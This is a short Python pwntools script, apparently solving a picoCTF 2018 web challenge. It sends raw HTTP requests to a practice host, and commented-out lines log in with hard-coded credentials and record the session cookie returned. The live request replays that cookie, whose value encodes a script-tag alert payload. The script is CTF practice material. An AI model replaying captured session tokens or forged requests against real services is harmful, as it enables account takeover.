#!/usr/bin/env python

from pwn import *

host, port = '2018shell3.picoctf.com', 46083
s = remote(host, port)

print(s.recv().decode("ascii"))
print(s.recv().decode("ascii"))
s.sendline(input())

# s.send("GET /login\nHost: flag.local\n\n")
# print(s.recv().decode("ascii"))
# print(s.recv().decode("ascii"))

# s.send("POST /login HTTP/1.1\nHost: flag.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\n\nuser=realbusinessuser&pass=potoooooooo\n\n")
# print(s.recv().decode("ascii"))
# print(s.recv().decode("ascii"))
# set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/

s.send("GET / HTTP/1.1\nHost: flag.local\nCookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D\n\n")

s.interactive()